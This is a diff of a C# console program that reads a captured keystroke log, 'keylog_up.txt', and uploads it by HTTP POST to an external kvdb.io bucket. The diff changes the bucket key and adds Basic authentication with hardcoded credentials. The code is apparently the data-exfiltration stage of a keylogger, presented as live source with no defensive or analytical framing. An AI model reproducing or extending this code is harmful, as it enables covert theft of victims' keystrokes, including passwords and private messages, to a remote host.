@@ -1,4 +1,5 @@
 using System;
+using System.Text;
 
 using System.Diagnostics;
 
@@ -54,20 +55,20 @@ namespace ConsoleApplication1
 		 
 		
 		
-		string res="2CD41GteLYLuvotryGMN5g"; 
+		string res="CDzDwtLAqYpMvf8Ym18Tk7"; 
 		string res_key=res;
 		string updated_ep="https://kvdb.io/"+res_key+"/hits";
 		//string path =@"D:";
 		string file_text=File.ReadAllText(@path + @"\keylog_up.txt",System.Text.Encoding.UTF8);
 		var res1=obj.PostRequestJson(updated_ep,file_text);
-
+		//var res1=obj.PostRequestJson(updated_ep,"Furqan khan");
                 //sw.Write(res1);
 
                 
 	     	//Console.WriteLine(res1);
 		var res2=obj.getData(updated_ep);
 		// sw.Write(res1);
-		//Console.WriteLine(res2);
+		Console.WriteLine("Resp obtained : "+res2);
 		//sw.Close();
 		}
 		catch(Exception ex)
@@ -144,6 +145,8 @@ namespace ConsoleApplication1
         		client.BaseAddress = endpoint;
         		// HTTP GET
         		client.UseDefaultCredentials = true;
+				string credentials = Convert.ToBase64String(Encoding.ASCII.GetBytes("password" + ":" + "password"));
+				//client.Headers[HttpRequestHeader.Authorization] = string.Format("Basic {0}", credentials);
         		var jsonResponse = client.DownloadString(endpoint);
 			return jsonResponse;
     			}
@@ -184,28 +187,41 @@ namespace ConsoleApplication1
 	    		//client.Proxy = wp;
 
             		client.UseDefaultCredentials = true;
-            		client.Headers.Add("Content-Type:application/json");
-            		client.Headers.Add("Accept:application/json");
+            		client.Headers.Add("Content-Type: application/x-www-form-urlencoded");
+            		client.Headers.Add("Accept: */*");
+					//client.Encoding = Encoding.UTF8;
+					string credentials = Convert.ToBase64String(Encoding.ASCII.GetBytes("Lovelygate002@" + ":" + "password"));
+					//Console.WriteLine("HEADER FORMED VALUE : "+credentials);
+					//Console.WriteLine("Actual Header " + string.Format("Basic {0}", credentials));
+					client.Headers.Add("Authorization: "+string.Format("Basic {0}", credentials));
             		var uri = new Uri(endpoint);
-           		 var response = client.UploadString(uri, "POST", json);
+           		    var response = client.UploadString(uri, "POST", json);
             		jsonResponse = response;
+					WebHeaderCollection myWebHeaderCollection = client.ResponseHeaders;
+
+					/*Console.WriteLine("\nDisplaying the response headers\n");
+					// Loop through the ResponseHeaders and display the header name/value pairs. 
+					for (int i=0; i < myWebHeaderCollection.Count; i++)             
+						Console.WriteLine ("\t" + myWebHeaderCollection.GetKey(i) + " = " + myWebHeaderCollection.Get(i));*/
        			 }
         	catch (WebException ex)
         		{
             		// Http Error
             		if (ex.Status == WebExceptionStatus.ProtocolError)
             		{
-               		HttpWebResponse wrsp = (HttpWebResponse)ex.Response;
-               		var statusCode = (int)wrsp.StatusCode;
-               		var msg = wrsp.StatusDescription;
-			Console.WriteLine("Exception : " + msg);
-			return msg;
+						 string response = new StreamReader(ex.Response.GetResponseStream()).ReadToEnd();
+						 Console.WriteLine("Error is :" +response);
+						HttpWebResponse wrsp = (HttpWebResponse)ex.Response;
+						var statusCode = (int)wrsp.StatusCode;
+						var msg = wrsp.StatusDescription;
+						Console.WriteLine("Exception : " + msg + wrsp.StatusCode);
+						return msg;
                		// throw new HttpException(statusCode, msg);
             		}
             		else
             		{
                 		Console.WriteLine("Exception 11" + ex.Message);
-				return ex.Message;
+						return ex.Message;
             		}
         		}
     		}
